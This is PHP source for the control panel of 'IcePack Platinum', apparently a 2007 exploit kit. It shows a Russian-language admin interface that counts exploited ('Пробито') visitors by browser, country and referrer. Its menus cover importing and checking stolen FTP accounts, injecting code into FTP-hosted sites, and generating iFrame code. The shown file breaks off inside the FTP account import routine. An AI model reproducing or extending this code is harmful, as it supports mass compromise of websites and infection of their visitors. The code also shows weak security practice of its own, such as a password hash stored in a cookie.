<?php
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	IcePack Platinum Edition
-----------------------------------------------------
	2007 (c) IDT Group
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);


session_start ();

include "../config.php";
include "../db.php";

include "functions.php";
include "../mysql.php";

$code_to_name = array (
		  	"AP" => "Asia/Pacific Region", "EU" => "Europe", "AD" => "Andorra","AE" => "United Arab Emirates",
		  	"AF" => "Afghanistan","AG" => "Antigua and Barbuda","AI" => "Anguilla","AL" => "Albania",
		  	"AM" => "Armenia","AN" => "Netherlands Antilles","AO" => "Angola","AQ" => "Antarctica",
		  	"AR" => "Argentina","AS" => "American Samoa","AT" => "Austria","AU" => "Australia",
		  	"AW" => "Aruba","AZ" => "Azerbaijan","BA" => "Bosnia and Herzegovina","BB" => "Barbados",
		  	"BD" => "Bangladesh","BE" => "Belgium","BF" => "Burkina Faso","BG" => "Bulgaria",
		  	"BH" => "Bahrain","BI" => "Burundi","BJ" => "Benin","BM" => "Bermuda","BN" => "Brunei Darussalam",
		  	"BO" => "Bolivia","BR" => "Brazil","BS" => "Bahamas","BT" => "Bhutan","BV" => "Bouvet Island",
		  	"BW" => "Botswana","BY" => "Belarus","BZ" => "Belize","CA" => "Canada","CC" => "Cocos (Keeling) Islands",
		  	"CD" => "Congo, The Democratic Republic of the","CF" => "Central African Republic","CG" => "Congo",
		  	"CH" => "Switzerland","CI" => "Cote D'Ivoire","CK" => "Cook Islands","CL" => "Chile","CM" => "Cameroon",
		  	"CN" => "China","CO" => "Colombia","CR" => "Costa Rica","CU" => "Cuba","CV" => "Cape Verde",
		  	"CX" => "Christmas Island","CY" => "Cyprus","CZ" => "Czech Republic","DE" => "Germany","DJ" => "Djibouti",
		  	"DK" => "Denmark","DM" => "Dominica","DO" => "Dominican Republic","DZ" => "Algeria","EC" => "Ecuador",
		  	"EE" => "Estonia","EG" => "Egypt","EH" => "Western Sahara","ER" => "Eritrea","ES" => "Spain",
		  	"ET" => "Ethiopia","FI" => "Finland","FJ" => "Fiji","FK" => "Falkland Islands (Malvinas)",
		  	"FM" => "Micronesia, Federated States of","FO" => "Faroe Islands","FR" => "France",
		  	"FX" => "France, Metropolitan","GA" => "Gabon","GB" => "United Kingdom","GD" => "Grenada","GE" => "Georgia",
		  	"GF" => "French Guiana","GH" => "Ghana","GI" => "Gibraltar","GL" => "Greenland","GM" => "Gambia","GN" => "Guinea",
		  	"GP" => "Guadeloupe","GQ" => "Equatorial Guinea","GR" => "Greece","GS" => "South Georgia and the South Sandwich Islands",
		  	"GT" => "Guatemala","GU" => "Guam","GW" => "Guinea-Bissau","GY" => "Guyana","HK" => "Hong Kong","HM" => "Heard Island and McDonald Islands",
		  	"HN" => "Honduras","HR" => "Croatia","HT" => "Haiti","HU" => "Hungary","ID" => "Indonesia","IE" => "Ireland",
		  	"IL" => "Israel","IN" => "India","IO" => "British Indian Ocean Territory","IQ" => "Iraq","IR" => "Iran, Islamic Republic of","IS" => "Iceland",
		  	"IT" => "Italy","JM" => "Jamaica","JO" => "Jordan","JP" => "Japan","KE" => "Kenya","KG" => "Kyrgyzstan",
		  	"KH" => "Cambodia","KI" => "Kiribati","KM" => "Comoros","KN" => "Saint Kitts and Nevis","KP" => "Korea, Democratic People's Republic of",
		  	"KR" => "Korea, Republic of","KW" => "Kuwait","KY" => "Cayman Islands","KZ" => "Kazakstan","LA" => "Lao People's Democratic Republic",
		  	"LB" => "Lebanon","LC" => "Saint Lucia","LI" => "Liechtenstein","LK" => "Sri Lanka","LR" => "Liberia","LS" => "Lesotho",
		  	"LT" => "Lithuania","LU" => "Luxembourg","LV" => "Latvia","LY" => "Libyan Arab Jamahiriya","MA" => "Morocco",
		  	"MC" => "Monaco","MD" => "Moldova, Republic of","MG" => "Madagascar","MH" => "Marshall Islands","MK" => "Macedonia",
		  	"ML" => "Mali","MM" => "Myanmar","MN" => "Mongolia","MO" => "Macau","MP" => "Northern Mariana Islands",
		  	"MQ" => "Martinique","MR" => "Mauritania","MS" => "Montserrat","MT" => "Malta","MU" => "Mauritius","MV" => "Maldives",
		  	"MW" => "Malawi","MX" => "Mexico","MY" => "Malaysia","MZ" => "Mozambique","NA" => "Namibia","NC" => "New Caledonia",
		  	"NE" => "Niger","NF" => "Norfolk Island","NG" => "Nigeria","NI" => "Nicaragua","NL" => "Netherlands","NO" => "Norway",
		  	"NP" => "Nepal","NR" => "Nauru","NU" => "Niue","NZ" => "New Zealand","OM" => "Oman","PA" => "Panama","PE" => "Peru",
		  	"PF" => "French Polynesia","PG" => "Papua New Guinea","PH" => "Philippines","PK" => "Pakistan","PL" => "Poland",
		  	"PM" => "Saint Pierre and Miquelon","PN" => "Pitcairn Islands","PR" => "Puerto Rico","PS" => "Palestinian Territory",
		  	"PT" => "Portugal","PW" => "Palau","PY" => "Paraguay","QA" => "Qatar","RE" => "Reunion","RO" => "Romania","RU" => "Russian Federation",
		  	"RW" => "Rwanda","SA" => "Saudi Arabia","SB" => "Solomon Islands","SC" => "Seychelles","SD" => "Sudan","SE" => "Sweden",
		  	"SG" => "Singapore","SH" => "Saint Helena","SI" => "Slovenia","SJ" => "Svalbard and Jan Mayen","SK" => "Slovakia",
		  	"SL" => "Sierra Leone","SM" => "San Marino","SN" => "Senegal","SO" => "Somalia","SR" => "Suriname","ST" => "Sao Tome and Principe",
		  	"SV" => "El Salvador","SY" => "Syrian Arab Republic","SZ" => "Swaziland","TC" => "Turks and Caicos Islands",
		  	"TD" => "Chad","TF" => "French Southern Territories","TG" => "Togo","TH" => "Thailand","TJ" => "Tajikistan",
		  	"TK" => "Tokelau","TM" => "Turkmenistan","TN" => "Tunisia","TO" => "Tonga","TL" => "Timor-Leste",
		  	"TR" => "Turkey","TT" => "Trinidad and Tobago","TV" => "Tuvalu","TW" => "Taiwan","TZ" => "Tanzania, United Republic of",
		  	"UA" => "Ukraine","UG" => "Uganda","UM" => "United States Minor Outlying Islands","US" => "United States",
		  	"UY" => "Uruguay","UZ" => "Uzbekistan","VA" => "Holy See (Vatican City State)","VC" => "Saint Vincent and the Grenadines",
		  	"VE" => "Venezuela","VG" => "Virgin Islands, British","VI" => "Virgin Islands, U.S.","VN" => "Vietnam",
		  	"VU" => "Vanuatu","WF" => "Wallis and Futuna","WS" => "Samoa","YE" => "Yemen","YT" => "Mayotte","RS" => "Serbia",
		  	"ZA" => "South Africa","ZM" => "Zambia","ME" => "Montenegro","ZW" => "Zimbabwe","A1" => "Anonymous Proxy",
		  	"A2" => "Satellite Provider","O1" => "Other","AX" => "Aland Islands","GG" => "Guernsey","IM" => "Isle of Man","JE" => "Jersey");

if(isset($_GET['do']))   $do   = $_GET['do'];   else $do   = "";

$time = 'total';

if ($do == 'logout')
{
	setcookie ('ice_user');
	setcookie ('ice_pwd');
	session_destroy ();
	header ('Location: index.php');
}

function cMenuArrow($text)
{
	$tmp = "<table border=0><tr><td><img src='icons/bullet_go.png' border=0></td><td>".$text."</td></table>";
	return $tmp;	
}

function cMenuItem($src, $text)
{
	$tmp = "<table border=0><tr><td><img src='icons/".$src."' border=0></td><td>".$text."</td></table>";
	return $tmp;
}

if (@$_COOKIE['ice_user'] != $config['admin_name'] || @$_COOKIE['ice_pwd'] != md5($config['admin_pass'])
 || isset($_SESSION['ice_log']))
{
	if (isset($_POST['check_auth']))
	{
		$ice_user = $_POST['ice_user'];
		$ice_pwd  = $_POST['ice_pwd'];
		
		if ($ice_user == $config['admin_name'] && $ice_pwd == $config['admin_pass'])
		{
			session_register ('ice_log', 1);
			setcookie ('ice_user', $ice_user);
			setcookie ('ice_pwd', md5($ice_pwd));
			header ('Location: index.php');
		}
	}
	
	?>
<html>
	<head>
		<title>LogIn</title>
		<style>
			.cell
			{
			  font-family: verdana;
			  font-size:   12px;
			  color:       #666;
			  text-align:  right;
			}
			.loginBox
			{
			  font-family:    verdana;
			  text-align:     center;
			  vertical-align: middle;
			  background:     #E3F1FF;			  
			}
		</style>
	</head>
	<body>
		<div align="center">
		<form method="post">
			<table cellpadding="0" cellspacing="0" border="0">
				<tr>
					<td height="18" width="18" background="images/top_left.gif"></td>
					<td height="18" width="300" background="images/top_center.gif"></td>
					<td height="18" width="18" background="images/top_right.gif"></td>
				</tr>
				<tr>
					<td background="images/bok_left.gif"></td>
					<td width="300" height="300" class="loginBox">
						<img alt="" src="images/logo.gif">
						<table cellpadding="2" cellspacing="0" border="0">
							<tr>
								<td class="cell">Имя:</td>
								<td><input type="text" name="ice_user"></td>
							</tr>
							<tr>
								<td class="cell">Пароль:</td>
								<td><input type="password" name="ice_pwd"></td>
							</tr>
							<tr>
					<td colspan="2" align="right"><input type="submit" name="check_auth" value="Вход"></td>
				</tr>
			</table>
  </td>
  <td background="images/bok_right.gif"></td>
 </tr>
 <tr>
  <td height="18" width="18" background="images/niz_left.gif"></td>
  <td height="18" width="300" background="images/niz_center.gif"></td>
  <td height="18" width="18" background="images/niz_right.gif"></td>  
 </tr> 
</table>			
		</form>		
		</div>
	</body>
</html>
	<?
	exit();
}

$db = new db;

$SCRIPT = $_SERVER['PHP_SELF'];

if(isset($_GET['sub']))  $sub  = $_GET['sub'];  else $sub  = "";

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" 
"http://www.w3.org/TR/html4/loose.dtd">
<html>
   <head>
		<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
		<title>IcePack Platinum</title>
		<script type="text/javascript" src="menu.js"></script>
		<script type="text/javascript" src="overlib.js"></script>
		<link rel="stylesheet" type="text/css" href="style.css">
		
		<script language="JavaScript">
			function setCookie(name, value, expires, path, domain, secure)
			{
				var curCookie = name + "=" + escape(value) + 
				((expires) ? "; expires=" + expires.toGMTString() : "") + 
				((path) ? "; path=" + path : "") + 
				((domain) ? "; domain=" + domain : "") + 
				((secure) ? "; secure" : "");
				
				document.cookie = curCookie;
			}
			function switch_time(selectobj)
			{
				var id = selectobj.options[selectobj.selectedIndex].value;
				if (id == '') { return; }
				setCookie('time');
				setCookie('time', id);
				var url = new String(window.location);
				window.location = url;
			}
		</script>
	</head>
	
	<body>
		
			<table border="0" cellspacing="0" cellpadding="0" style="width:100%;">
				<tr>
					<td><img alt="" src="images/logo.jpg"></td>
					<td align="left" style="vertical-align: top; padding-top: 45px;">
						<table border="0" cellspacing="0" cellpadding="0" width="100%">
							<tr valign="top">
								<td width="115px">
									<div style="position:relative">
										<script language="JavaScript">
											<!--
											<?=ShowMenu(1);?>
											menu1.entry(1, 20, "<?=cMenuItem('home.png', 'На главную')?>", "<?=$SCRIPT;?>?");
											menu1.create();
											//-->
										</script>
									</div>
								</td>
								<td width="115px">
									<div style="position:relative">
										<script language="JavaScript">
											<!--
											<?=ShowMenu(2);?>
											menu2.entry(1, 20, "<?=cMenuItem('stat.png', 'Статистика')?>");
											menu2.entry(2, 20, "<?=cMenuArrow('Системы')?>", '<?=$SCRIPT;?>?do=stats&sub=os');
											menu2.entry(2, 20, "<?=cMenuArrow('Обозреватели')?>", '<?=$SCRIPT;?>?do=stats&sub=browsers');
											menu2.entry(2, 20, "<?=cMenuArrow('Загрузки')?>", '<?=$SCRIPT;?>?do=stats&sub=loads');
											menu2.entry(2, 20, "<?=cMenuArrow('Страны')?>", '<?=$SCRIPT;?>?do=stats&sub=countries');
											menu2.entry(2, 20, "<?=cMenuArrow('Рефералы')?>", '<?=$SCRIPT;?>?do=stats&sub=referers');
											menu2.entry(2, 20, "<?=cMenuArrow('Очистка')?>", '<?=$SCRIPT;?>?do=stats&sub=clean');
											menu2.create();
											//-->
										</script>
									</div>
								</td>
								<td width="115px">
									<div style="position:relative">
										<script language="JavaScript">
											<!--
											<?=ShowMenu(2);?>
											menu2.entry(1, 20, "<?=cMenuItem('ftp.png', 'Работа с FTP')?>");
											menu2.entry(2, 20, "<?=cMenuArrow('Импорт')?>", '<?=$SCRIPT;?>?do=ftp&sub=import');
											menu2.entry(2, 20, "<?=cMenuArrow('Экспорт')?>", '<?=$SCRIPT;?>?do=ftp&sub=export');
											menu2.entry(2, 20, "<?=cMenuArrow('Проверка')?>", '<?=$SCRIPT;?>?do=ftp&sub=check');
											menu2.entry(2, 20, "<?=cMenuArrow('Установка кода')?>", '<?=$SCRIPT;?>?do=ftp&sub=inject');
											menu2.entry(2, 20, "<?=cMenuArrow('Очистка')?>", '<?=$SCRIPT;?>?do=ftp&sub=clean');
											menu2.create();
											//-->
										</script>
									</div>
								</td>
								<td width="115px">
									<div style="position:relative">
										<script language="JavaScript">
											<!--
											<?=ShowMenu(3);?>
											menu3.entry(1, 20, "<?=cMenuItem('cog.png', 'Инструменты')?>");
											menu3.entry(2, 20, "<?=cMenuArrow('Код iFrame')?>", '<?=$SCRIPT;?>?do=iframe');
											menu3.entry(2, 20, "<?=cMenuArrow('Трафик')?>", '<?=$SCRIPT;?>?do=traffic');
											menu3.entry(2, 20, "<?=cMenuArrow('<b>Настройки</b>')?>", '<?=$SCRIPT;?>?do=settings');
											menu3.entry(2, 20, "<?=cMenuArrow('Чекер PR и Тиц')?>", '<?=$SCRIPT;?>?do=pr');
											menu3.create();
											//-->
										</script>
									</div>
								</td>
								<td width="120px">
									<div style="position:relative">
										<script language="JavaScript">
											<!--
											<?=ShowMenu(2);?>
											menu2.entry(1, 20, "<?=cMenuItem('quit.png', 'Выход')?>", '<?=$SCRIPT;?>?do=logout');
											menu2.create();
											//-->
										</script>
								</td>								
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</div>
				
		<div style="margin-bottom: 10px;"></div>
		
		<div id="contentNB" align="center">
		<?
		
		/*
		@Home
		*/
		
		if ($do == '')
		{
			$last_ip = $db->query("SELECT ip FROM statistics ORDER BY id DESC LIMIT 5");
			$sql_total = $db->query("SELECT COUNT(*) AS num FROM statistics");
			$ftp_total = $db->query("SELECT id FROM ftp");
			$ftp_checked = $db->query("SELECT id FROM ftp WHERE valid=1");
			$traffic = $db->query("SELECT * FROM traffic WHERE id=1");
			$un_traffic = $db->query("SELECT id FROM statistics");
			$loaded = $db->query("SELECT id FROM statistics WHERE is_dw=1");
			
			$total = $db->get_row ($sql_total);
			$ftp_total = $db->num_rows($ftp_total);
			$ftp_checked = $db->num_rows($ftp_checked);
			$traffic = $db->get_row($traffic);
			$traffic = $traffic['count'];
			$loaded = $db->num_rows($loaded);
			$un_traffic = $db->num_rows($un_traffic);
			?>
			<table border="0" cellspacing="0" cellpadding="0" style="width:90%;">
				<tr>
					<td colspan="2">
						<div class="box">
							<div class="alert">Главная страница</div>
							<div class="itemWrapper">
								Добро пожаловать!<br>
								Чтобы приступить к работе выберите нужный пункт в меню, расположенном 
								в верхней части экрана.<br>
							</div>
							<div class="itemWrapper">
							    <table border="0" cellspacing="0" cellpadding="0" style="width:100%;" align="center">
							      <tr>
							        <td width="20%"><b>PHP: </b></td>
							        <td width="20%"><b>MySQL :</b></td>
							        <td width="20%"><b>Safe Mode :</b></td>
							        <td width="20%"><b>IP сервера :</b></td>
							        <td width="20%"><b>Ваш IP :</b></td>
							      </tr>
							      <tr>
							        <td>
							          <?=phpversion()?>
							        </td>
							        <td>
							          <? if(function_exists('mysql_connect')) echo 'Да'; else 'Нет'; ?>
							        </td>
							        <td>
							          <? if(ini_get('safe_mode') == 1 || strtolower(ini_get('safe_mode') == 'on')) echo 'Вкл.';else echo 'Откл.'; ?>
							        </td>
							        <td>
							          <?=gethostbyname($_SERVER["HTTP_HOST"]);?>
							        </td>
							        <td>
							          <?=$_SERVER['REMOTE_ADDR'];?>
							        </td>
							      </tr>
							    </table>
							</div>
						</div>
					</td>
				</tr>
		<tr>
			<td colspan="2">
		  <table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:100%;">
		  	<tr>
		  		<td colspan="2" class="tableHeading">Информация</td>
		  	</tr>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><b>Всего траффика :</b></td>
		  		<td class="tableCellTwo" width="50%" align="left"><?=$traffic?></td>
		  	</tr>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><b>Уникальных :</b></td>
		  		<td class="tableCellTwo" width="50%" align="left"><? echo $un_traffic." (".abc(($un_traffic * 100) /  $traffic) ."%)"; ?></td>
		  	</tr>		  	
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><b>Пробито :</b></td>
		  		<td class="tableCellTwo" width="50%" align="left"><? echo $loaded." (".abc(($loaded * 100) / $un_traffic)."%)"; ?></td>
		  	</tr>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><b>Всего фтп :</b></td>
		  		<td class="tableCellTwo" width="50%" align="left"><?=$ftp_total?></td>
		  	</tr>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><b>Рабочих фтп :</b></td>
		  		<td class="tableCellTwo" width="50%" align="left"><? echo $ftp_checked." (".abc(($ftp_checked * 100) / $ftp_total)."%)"; ?></td>
		  	</tr>			  		  			  		  	
		  </table>
			</td>
		</tr>
        <tr>
		<td colspan="2" width="100%">
		  <table border="0" cellspacing="0" cellpadding="0" width="100%">
		  <tr>
			<td align="left" width="33%" valign="top">
				<table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:99%;">
					<tr>
						<td class="tableHeading">Топ 10 рефералов / [Уники]</td>
					</tr>
					<?
					$result = $db->query("SELECT referer, COUNT(*) AS total FROM statistics GROUP BY referer ORDER BY total DESC LIMIT 10");
					while ($row = $db->get_array($result))
					{
					?>
					<tr>
						<td class="tableCellTwo" width="100%" align="left"><?=$row["referer"]."&nbsp;&nbsp;&nbsp;[".$row['total']."]"?></td>
					</tr>
					<?
					}
					?>
				</table>
			</td>
			<td align="left" width="33%" valign="top">
				<table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:99%;">
					<tr>
						<td class="tableHeading">Топ 10 стран / [Уники]</td>
					</tr>
					<?
					$result = $db->query("SELECT country, COUNT(*) AS total FROM statistics GROUP BY country ORDER BY total DESC LIMIT 10");
					while ($row = $db->get_array($result))
					{
						$country_code = $row["country"];
		  		  	    $country_name = $code_to_name[$country_code];
					?>
					<tr>
						<td class="tableCellTwo" width="100%" align="left"><? echo ($country_name."&nbsp;&nbsp;&nbsp;[".$country_code."][".$row['total']."]"); ?></td>
					</tr>
					<?
					}
					?>
		        </table>
		    </td>
			<td align="left" width="33%" valign="top">
				<table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:100%;">
					<tr>
						<td class="tableHeading">Топ 10 браузеров / [Уники]</td>
					</tr>
					<?
					$result = $db->query("SELECT browser, COUNT(*) AS total FROM statistics GROUP BY browser ORDER BY total DESC LIMIT 10");
					while ($row = $db->get_array($result))
					{
					?>
					<tr>
						<td class="tableCellTwo" width="100%" align="left"><?=$row["browser"]."&nbsp;&nbsp;&nbsp;[".$row['total']."]"?></td>
					</tr>
					<?
					}
					?>
		        </table>
		    </td>
		  </tr>
		  <tr><td colspan="2">&nbsp;</td></tr>		    
		  </table>
        </td>
        </tr>
		<tr>				
			<td align="left" width="50%%">
				<table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:99%;">
					<tr>
						<td class="tableHeading">Последние 5 IP</td>
					</tr>
					<?
					while ($row = $db->get_array($last_ip))
					{
					?>
					<tr>
						<td class="tableCellTwo" width="33%" align="left"><?=$row["ip"]?></td>
					</tr>
					<?
					}
					?>
				</table>
			</td>		
			<td align="left" width="50%">
				<? $last_os = $db->query("SELECT os FROM statistics ORDER BY id DESC LIMIT 5"); ?>
				<table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:100%;">
					<tr>
						<td class="tableHeading">Последние 5 ОС</td>
					</tr>
				<?
				while ($row = $db->get_array($last_os))
		  		{
		  		?>
		  			<tr>
		  				<td class="tableCellTwo" width="33%" align="left"><?=$row["os"]?></td>
		  			</tr>		  	
		  		<?
		    	}
		    	?>
		  		</table>
			</td>
		</tr>
	</table>

	<?
		}
		
		if ($do == 'pr')
		{
		  ?>
		  <form method="post" enctype="multipart/form-data">
		  <input type="hidden" name="do" value="pr"></input>
		  <table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:90%;">
		  	<tr>
		  		<td class="tableHeading" colspan="2">Массовая проверка PR и тИЦ</td>
		  	</tr>
		  <?
		  if (isset($_POST['up']))
		  {
			if(is_uploaded_file($_FILES['file']['tmp_name']))
			{
				@copy($_FILES['file']['tmp_name'],"./tmp/pr.txt");
				$file = "./tmp/pr.txt";
			}		  	
		  	?>
			<tr><td class="tableCellTwo">
			  <table border="0" cellspacing="0" cellpadding="0" style="width:100%">
			    <tr>
				   <td align="left"><b>&nbsp;URL</b></td>
				   <td width="60"><b>PR</b></td>
				   <td width="60"><b>тИЦ</b></td>
				</tr>
			<?
			  $lfile = file($file);
			  for ($i=0; $i<count($lfile); $i++)
			  {
			  	$host = $lfile[$i];
				$pr = pr_google($host);
			    $tic = yandex_tic($host);
			  	echo "<tr><td align='left'>&nbsp;".$host."</td>";
			  	echo "<td width='60'>".$pr."</td><td width='60'>".$tic."</td></tr>";
			  	flush();			
			  }
			?>
			<tr><td colspan="3">&nbsp;</td></tr>
			<tr><td class="tableHeading" colspan="4" align="center">Готово.</td></tr>
			</table></td></tr>
			<?
		  } else
		  {
		    ?>
			<tr><td class="tableCellTwo" colspan="2"><b>Введите ссылки:</b></td></tr>
			<tr>
			  <td class="tableCellTwo" style="width:50%; text-align: right;"><b>Файл c доменами <?=ShowHelp("<b>Вида:</b><br>site.ru<br>site.ru<br>site.ru");?> :</b></td>
			  <td class="tableCellTwo" style="width:50%; text-align: left;">
			    <input type="hidden" name="up" value="1">
			    <input type="file" name="file" style="width:100%;">
			  </td>
			</tr>
			<tr><td class="tableCellTwo" colspan="2">
			  <div class="buttonWrapper" style="text-align: left;"><input type="submit" value="Начать"></div>
			</td></tr>
			<?
		  }
		  echo "</form></table>";
		}
		
		/*
		@Statistics
		*/

		if ($do == 'stats')
		{
			if($sub == 'clean')
			{
				if (isset($_POST['now']))
				{
					$db->query("TRUNCATE TABLE statistics");
					$db->query("UPDATE traffic SET count=0 WHERE id=1");
					MessageBox(1,"Все данные статистики удалены");
				}
				$data = '
			<form method="post">
			Вы уверены, что хотите удалить все данные статистики?<br />
			<br />
			<div class="buttonWrapper">
        <input type="submit" name="now" value="Продолжить">
            </div>
			</form>';
			MessageBox(1, $data);
		  }
		  
		  if ($sub == 'os')
		  {
		  	$sql_os = "SELECT os, COUNT(*) AS total FROM statistics";
		  	
		  	if($time == 'total')       $result = $db->query($sql_os." GROUP BY os ORDER BY total DESC");
		  ?>
		  <table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:90%;">
		  	<tr>
		  		<td class="tableHeading" colspan="2">Операционные системы</td>
		  	</tr>
		  <?
		  while ($row = $db->get_array($result))
		  {
		  ?>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><b><?=$row["os"]?> :</b></td>
		  		<td class="tableCellTwo" width="50%" align="left"><?=$row["total"]?></td>
		  	</tr>
		  <?
		  }
		  ?>
		  </table>
		  <?
		  }
		  
		  if ($sub == 'browsers')
		  {
		  	$sql_browsers = "SELECT browser, COUNT(*) AS total FROM statistics";
		  	
		  	if($time == 'total')     $result = $db->query($sql_browsers.' GROUP BY browser ORDER BY total DESC');
		  ?>
		  <table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:90%;">
		  	<tr>
		  		<td class="tableHeading" colspan="2">Обозреватели</td>
		  	</tr>
		  <?
		  while ($row = $db->get_array($result))
		  {
		  ?>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><b><?=$row["browser"]?> :</b></td>
		  		<td class="tableCellTwo" width="50%" align="left"><?=$row["total"]?></td>
		  	</tr>
		  <?
		  }
		  ?>
		  </table>
		  <?
		  }
		  
		  if ($sub == 'loads')
		  {
		  	$sql_stats = "SELECT COUNT(*) AS dw FROM statistics";
		  	
		  	if($time == 'total')
		  	{
		  		$result_ie     = $db->query($sql_stats." WHERE type = 'Internet Explorer'");
		  		$result_dw_ie  = $db->query($sql_stats." WHERE type = 'Internet Explorer' AND is_dw = 1");
		  		$result_ff     = $db->query($sql_stats." WHERE type = 'Firefox'");
		  		$result_dw_ff  = $db->query($sql_stats." WHERE type = 'Firefox' AND is_dw = 1");
		  		$result_o      = $db->query($sql_stats." WHERE type = 'Opera'");
		  		$result_dw_o   = $db->query($sql_stats." WHERE type = 'Opera' AND is_dw = 1");		  		
		  		$result_all    = $db->query($sql_stats);
		  		$result_dw_all = $db->query($sql_stats." WHERE is_dw = 1");
		  	}
		  	
		  	$row    = $db->get_array($result_ie);
		  	$dwn_ie = $row['dw'];
		  	$row_ie = $db->get_array($result_dw_ie);
		  	?>
		  <table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:90%;">
		  	<tr>
		  		<td class="tableHeading" colspan="2">Загрузки</td>
		  	</tr>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><img alt="Internet Explorer" src="images/i.png"></td>
		  		<td class="tableCellTwo" width="50%" align="left">
		  		<?
		  		if($row_ie["dw"] != 0) echo $row_ie["dw"] . " (" . (intval(($row_ie["dw"]/$dwn_ie)*100)) . "%)"; else echo "0 (0%)";
		  		?>
		  		</td>
		  	</tr>
		  	<?
		  	$row    = $db->get_array($result_ff);
		  	$dwn_ff = $row['dw'];
		  	$row_ff = $db->get_array($result_dw_ff);
		  	?>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><img alt="FireFox" src="images/f.png"></td>
		  		<td class="tableCellTwo" width="50%" align="left">
		  		<?
		  		if($row_ff["dw"] != 0) echo $row_ff["dw"] . " (" . (intval(($row_ff["dw"]/$dwn_ff)*100)) . "%)"; else echo "0 (0%)";
		  	?>
		  		</td>
		  	</tr>
		  	<?
		  	$row   = $db->get_array($result_o);
		  	$dwn_o = $row['dw'];
		  	$row_o = $db->get_array($result_dw_o);
		  	?>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><img alt="Opera" src="images/o.png"></td>
		  		<td class="tableCellTwo" width="50%" align="left">
		  		<?
		  		if($row_o["dw"] != 0) echo $row_o["dw"] . " (" . (intval(($row_o["dw"]/$dwn_o)*100)) . "%)"; else echo "0 (0%)";
		  	?>
		  		</td>
		  	</tr>		  	
		  	<?
		  	$row     = $db->get_array($result_all);
		  	$dwn_all = $row['dw'];
		  	$row_all = $db->get_array($result_dw_all);
		  	?>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><b>Общее число загрузок :</b></td>
		  		<td class="tableCellTwo" width="50%" align="left">
		  		<?
		  		if($row_all["dw"] != 0) echo $row_all["dw"] . " (" . (intval(($row_all["dw"]/$dwn_all)*100)) . "%)"; else echo "0 (0%)";
		  	?>
		  		</td>
		  	</tr>
		  </table>
		  <?
		  }
		  
		  if ($sub == 'countries')
		  {		  	
		  	$sql_coutries = "SELECT country, COUNT(*) AS total FROM statistics";
		  	
		  	if($time == 'total')     $result = $db->query($sql_coutries.' GROUP BY country ORDER BY total DESC');
		  ?>
		  <table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:90%;">
		  	<tr>
		  		<td class="tableHeading" colspan="2">Страны</td>
		  	</tr>
		  <?
		  while ($row = $db->get_array($result))
		  {
		  ?>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right">
		  			<?
		  			$country_code = $row["country"];
		  			$country_name = $code_to_name[$country_code];
		  			$file = 'flags/'.strtolower($country_code).'.png';
		  			
		  			$img = (file_exists($file)) ? '<img src="'.$file.'" alt="'.$country_name.'">' : '<img src="flags/unknown.png" alt="'.$country_name.'">';
		  			echo $img;
		  			?>
		  		</td>
		  		<td class="tableCellTwo" width="50%" align="left"><?=$row["total"]?></td>
		  	</tr>
		  <?
		  }
		  ?>
		  </table>
		  <?
		  }
		  
		  if ($sub == 'referers')
		  {
		  	if($time == 'total')
		  	{
		  		$result = $db->query("SELECT referer, COUNT(*) AS total FROM statistics GROUP BY referer ORDER BY total DESC");
		  		$ttl    = $db->query("SELECT referer FROM statistics");
		  	}
		  	
		  	$all = $db->num_rows($ttl);
		  	
		  ?>
		  <table border="0" cellspacing="0" cellpadding="0" class="tableBorder" style="width:90%;">
		  	<tr>
		  		<td class="tableHeading" colspan="2">Рефералы</td>
		  	</tr>
		  <?
		  while ($row = $db->get_array($result))
		  {
		  	if (empty($row["referer"])) $row["referer"] = "N/A";
		  ?>
		  	<tr>
		  		<td class="tableCellTwo" width="50%" align="right"><b><?=$row["referer"]?> :</b></td>
		  		<td class="tableCellTwo" width="50%" align="left"><?=$row["total"]?> (<?=intval(($row["total"]/$all)*100)?>%)</td>
		  	</tr>
		  <?
		  }
		  ?>
		  </table>
		  <?
		  	
		  }
		}
		
		/*
		@FTP
		*/
		
		if ($do == "ftp")
		{
            // Import //		
			if ($sub == "import")
			{
				if(isset($_POST['import']))
				{
					if(is_uploaded_file($_FILES['file']['tmp_name']))
					{
						if(@copy($_FILES['file']['tmp_name'], "./tmp/ftps")) $tmp = "./tmp/ftps";
					} else $tmp = $_POST['local_file'];
					
					$i = 0;
					$fp = @fopen($tmp, "r");
					if (!$fp) MessageBox(0, "Файл ".$tmp." не найден");
					
					while(!feof($fp))
					{
						$account   = trim(fgets($fp));
						$p_account = parse_ftp($account);

						$bad = false;
						
						if ($p_account['login'] == "anonymous" || empty($p_account['login']) || empty($p_account['pass'])) $bad = true;
						
						if (preg_match("/\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/", $p_account['serv']))
						{
							$local_prefix = array ("10", "192", "172", "127");
